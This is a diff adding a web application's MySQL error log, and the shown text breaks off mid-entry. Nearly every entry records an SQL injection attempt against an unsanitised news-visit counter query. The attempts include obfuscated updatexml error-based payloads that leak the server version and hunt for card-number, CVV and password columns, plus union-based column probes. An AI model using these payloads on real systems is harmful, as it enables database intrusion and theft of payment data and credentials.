@@ -1,0 +1,82 @@
+Time : 23:33:29
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=
+
+Time : 19:12:35
+SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~0~'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=updatexml(rand(),(/**//**/sElEcT (/**//**/sElEcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x7e,count(*),0x7e))) /**//**/fRoM information_schema./**//**/sChEmAtA as d join information_schema./**//**/tAbLeS as t on t.table_schema=d./**//**/sChEmA_nAmE join information_schema./**//**/cOlUmNs as c on c.table_schema=d./**//**/sChEmA_nAmE and c.table_name=t.tAblE_nAmE /**//**/wHeRe not c./**//**/tAbLe_ScHeMa in (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and lower(c./**//**/cOlUmN_nAmE) like 0x25646562697425)),0)
+
+Time : 19:12:33
+SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~0~'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=updatexml(rand(),(/**//**/sElEcT (/**//**/sElEcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x7e,count(*),0x7e))) /**//**/fRoM information_schema./**//**/sChEmAtA as d join information_schema./**//**/tAbLeS as t on t.table_schema=d./**//**/sChEmA_nAmE join information_schema./**//**/cOlUmNs as c on c.table_schema=d./**//**/sChEmA_nAmE and c.table_name=t.tAblE_nAmE /**//**/wHeRe not c./**//**/tAbLe_ScHeMa in (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and lower(c./**//**/cOlUmN_nAmE) like 0x25646562697425)),0)
+
+Time : 19:12:31
+SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~0~'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=updatexml(rand(),(/**//**/sElEcT (/**//**/sElEcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x7e,count(*),0x7e))) /**//**/fRoM information_schema./**//**/sChEmAtA as d join information_schema./**//**/tAbLeS as t on t.table_schema=d./**//**/sChEmA_nAmE join information_schema./**//**/cOlUmNs as c on c.table_schema=d./**//**/sChEmA_nAmE and c.table_name=t.tAblE_nAmE /**//**/wHeRe not c./**//**/tAbLe_ScHeMa in (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and lower(c./**//**/cOlUmN_nAmE) like 0x2563726564697425)),0)
+
+Time : 19:12:29
+SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~0~'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=updatexml(rand(),(/**//**/sElEcT (/**//**/sElEcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x7e,count(*),0x7e))) /**//**/fRoM information_schema./**//**/sChEmAtA as d join information_schema./**//**/tAbLeS as t on t.table_schema=d./**//**/sChEmA_nAmE join information_schema./**//**/cOlUmNs as c on c.table_schema=d./**//**/sChEmA_nAmE and c.table_name=t.tAblE_nAmE /**//**/wHeRe not c./**//**/tAbLe_ScHeMa in (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and lower(c./**//**/cOlUmN_nAmE) like 0x2563635f6e756d25)),0)
+
+Time : 19:12:27
+SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~5.7.28-log~'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=updatexml(rand(),(/**//**/sElEcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x7e,version(),0x7e)))),0)
+
+Time : 19:12:27
+SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~5.7.28-log~'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=updatexml(rand(),(/**//**/sElEcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x7e,version(),0x7e)))),0)
+
+Time : 19:12:27
+SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~0~'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=updatexml(rand(),(/**//**/sElEcT (/**//**/sElEcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x7e,count(*),0x7e))) /**//**/fRoM information_schema./**//**/sChEmAtA as d join information_schema./**//**/tAbLeS as t on t.table_schema=d./**//**/sChEmA_nAmE join information_schema./**//**/cOlUmNs as c on c.table_schema=d./**//**/sChEmA_nAmE and c.table_name=t.tAblE_nAmE /**//**/wHeRe not c./**//**/tAbLe_ScHeMa in (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and lower(c./**//**/cOlUmN_nAmE) like 0x2563767625)),0)
+
+Time : 19:12:27
+SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~5.7.28-log~'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=updatexml(rand(),(/**//**/sElEcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x7e,version(),0x7e)))),0)
+
+Time : 19:12:24
+SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~5.7.28-log~'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=updatexml(rand(),(/**//**/sElEcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x7e,version(),0x7e)))),0)
+
+Time : 17:42:46
+SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~0~'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=updatexml(rand(),(/**//**/sElEcT (/**//**/sElEcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x7e,count(*),0x7e))) /**//**/fRoM information_schema./**//**/sChEmAtA as d join information_schema./**//**/tAbLeS as t on t.table_schema=d./**//**/sChEmA_nAmE join information_schema./**//**/cOlUmNs as c on c.table_schema=d./**//**/sChEmA_nAmE and c.table_name=t.tAblE_nAmE /**//**/wHeRe not c./**//**/tAbLe_ScHeMa in (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and lower(c./**//**/cOlUmN_nAmE) like 0x257573657225)),0)
+
+Time : 17:42:43
+SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~0~'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=updatexml(rand(),(/**//**/sElEcT (/**//**/sElEcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x7e,count(*),0x7e))) /**//**/fRoM information_schema./**//**/sChEmAtA as d join information_schema./**//**/tAbLeS as t on t.table_schema=d./**//**/sChEmA_nAmE join information_schema./**//**/cOlUmNs as c on c.table_schema=d./**//**/sChEmA_nAmE and c.table_name=t.tAblE_nAmE /**//**/wHeRe not c./**//**/tAbLe_ScHeMa in (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and lower(c./**//**/cOlUmN_nAmE) like 0x2570617373776f726425)),0)
+
+Time : 17:42:41
+SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~0~'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=updatexml(rand(),(/**//**/sElEcT (/**//**/sElEcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x7e,count(*),0x7e))) /**//**/fRoM information_schema./**//**/sChEmAtA as d join information_schema./**//**/tAbLeS as t on t.table_schema=d./**//**/sChEmA_nAmE join information_schema./**//**/cOlUmNs as c on c.table_schema=d./**//**/sChEmA_nAmE and c.table_name=t.tAblE_nAmE /**//**/wHeRe not c./**//**/tAbLe_ScHeMa in (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and lower(c./**//**/cOlUmN_nAmE) like 0x2570776425)),0)
+
+Time : 17:42:39
+SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~5.7.28-log~'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=updatexml(rand(),(/**//**/sElEcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x7e,version(),0x7e)))),0)
+
+Time : 17:42:36
+SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~5.7.28-log~'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=updatexml(rand(),(/**//**/sElEcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x7e,version(),0x7e)))),0)
+
+Time : 11:44:19
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'or 1=1 /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x39363135' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id= or 1=1 /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39,0x393631353738343330352e39,0x393631353738343330362e39,0x393631353738343330372e39,0x393631353738343330382e39,0x393631353738343330392e39,0x39363135373834333031302e39,0x39363135373834333031312e39,0x39363135373834333031322e39,0x39363135373834333031332e39,0x39363135373834333031342e39,0x39363135373834333031352e39,0x39363135373834333031362e39,0x39363135373834333031372e39,0x39363135373834333031382e39,0x39363135373834333031392e39,0x39363135373834333032302e39,0x39363135373834333032312e39,0x39363135373834333032322e39,0x39363135373834333032332e39,0x39363135373834333032342e39,0x39363135373834333032352e39,0x39363135373834333032362e39,0x39363135373834333032372e39,0x39363135373834333032382e39,0x39363135373834333032392e39,0x39363135373834333033302e39,0x39363135373834333033312e39,0x39363135373834333033322e39,0x39363135373834333033332e39,0x39363135373834333033342e39,0x39363135373834333033352e39
+
+Time : 11:44:18
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'or 1=1 /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x39363135' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id= or 1=1 /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39,0x393631353738343330352e39,0x393631353738343330362e39,0x393631353738343330372e39,0x393631353738343330382e39,0x393631353738343330392e39,0x39363135373834333031302e39,0x39363135373834333031312e39,0x39363135373834333031322e39,0x39363135373834333031332e39,0x39363135373834333031342e39,0x39363135373834333031352e39,0x39363135373834333031362e39,0x39363135373834333031372e39,0x39363135373834333031382e39,0x39363135373834333031392e39,0x39363135373834333032302e39,0x39363135373834333032312e39,0x39363135373834333032322e39,0x39363135373834333032332e39,0x39363135373834333032342e39,0x39363135373834333032352e39,0x39363135373834333032362e39,0x39363135373834333032372e39,0x39363135373834333032382e39,0x39363135373834333032392e39,0x39363135373834333033302e39,0x39363135373834333033312e39,0x39363135373834333033322e39,0x39363135373834333033332e39,0x39363135373834333033342e39
+
+Time : 11:44:18
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'or 1=1 /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x39363135' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id= or 1=1 /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39,0x393631353738343330352e39,0x393631353738343330362e39,0x393631353738343330372e39,0x393631353738343330382e39,0x393631353738343330392e39,0x39363135373834333031302e39,0x39363135373834333031312e39,0x39363135373834333031322e39,0x39363135373834333031332e39,0x39363135373834333031342e39,0x39363135373834333031352e39,0x39363135373834333031362e39,0x39363135373834333031372e39,0x39363135373834333031382e39,0x39363135373834333031392e39,0x39363135373834333032302e39,0x39363135373834333032312e39,0x39363135373834333032322e39,0x39363135373834333032332e39,0x39363135373834333032342e39,0x39363135373834333032352e39,0x39363135373834333032362e39,0x39363135373834333032372e39,0x39363135373834333032382e39,0x39363135373834333032392e39,0x39363135373834333033302e39,0x39363135373834333033312e39,0x39363135373834333033322e39,0x39363135373834333033332e39
+
+Time : 11:44:17
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'or 1=1 /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x39363135' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id= or 1=1 /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39,0x393631353738343330352e39,0x393631353738343330362e39,0x393631353738343330372e39,0x393631353738343330382e39,0x393631353738343330392e39,0x39363135373834333031302e39,0x39363135373834333031312e39,0x39363135373834333031322e39,0x39363135373834333031332e39,0x39363135373834333031342e39,0x39363135373834333031352e39,0x39363135373834333031362e39,0x39363135373834333031372e39,0x39363135373834333031382e39,0x39363135373834333031392e39,0x39363135373834333032302e39,0x39363135373834333032312e39,0x39363135373834333032322e39,0x39363135373834333032332e39,0x39363135373834333032342e39,0x39363135373834333032352e39,0x39363135373834333032362e39,0x39363135373834333032372e39,0x39363135373834333032382e39,0x39363135373834333032392e39,0x39363135373834333033302e39,0x39363135373834333033312e39,0x39363135373834333033322e39
+
+Time : 11:44:15
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'or 1=1 /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x39363135' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id= or 1=1 /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39,0x393631353738343330352e39,0x393631353738343330362e39,0x393631353738343330372e39,0x393631353738343330382e39,0x393631353738343330392e39,0x39363135373834333031302e39,0x39363135373834333031312e39,0x39363135373834333031322e39,0x39363135373834333031332e39,0x39363135373834333031342e39,0x39363135373834333031352e39,0x39363135373834333031362e39,0x39363135373834333031372e39,0x39363135373834333031382e39,0x39363135373834333031392e39,0x39363135373834333032302e39,0x39363135373834333032312e39,0x39363135373834333032322e39,0x39363135373834333032332e39,0x39363135373834333032342e39,0x39363135373834333032352e39,0x39363135373834333032362e39,0x39363135373834333032372e39,0x39363135373834333032382e39,0x39363135373834333032392e39,0x39363135373834333033302e39,0x39363135373834333033312e39
+
+Time : 11:44:14
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'or 1=1 /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353
